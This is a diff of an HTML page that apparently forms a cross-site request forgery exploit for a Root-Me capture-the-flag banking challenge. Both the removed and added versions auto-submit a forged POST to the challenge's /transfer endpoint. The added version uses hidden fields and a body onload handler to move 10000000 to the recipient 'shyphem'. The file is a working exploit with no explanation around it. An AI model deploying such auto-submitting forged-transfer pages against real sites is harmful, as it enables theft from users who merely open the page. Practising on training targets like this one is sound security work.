@@ -1,16 +1,13 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <title>Bank-Me v1</title>
+    <meta charset="UTF-8">
+    <title>Transfert</title>
 </head>
-<body>
-<form id="malicious" action="https://bankme-1.challenges.pro.root-me.org/transfer" method="post">
-   <input type="text" class="form-control" name="recipient" value="test">
-   <input type="number" class="form-control" name="amount" value="2">
-   <button type="submit" class="btn btn-rmp btn-rmp-secondary">Send</button>
-</form>
-<script>
-   document.getElementById('malicious').submit();
-</script>
+<body onload="document.forms['csrfForm'].submit()">
+    <form id="csrfForm" action="https://bankme-1.challenges.pro.root-me.org/transfer/" method="POST">
+        <input type="hidden" name="recipient" value="shyphem">
+        <input type="hidden" name="amount" value="10000000">
+    </form>
 </body>
 </html>
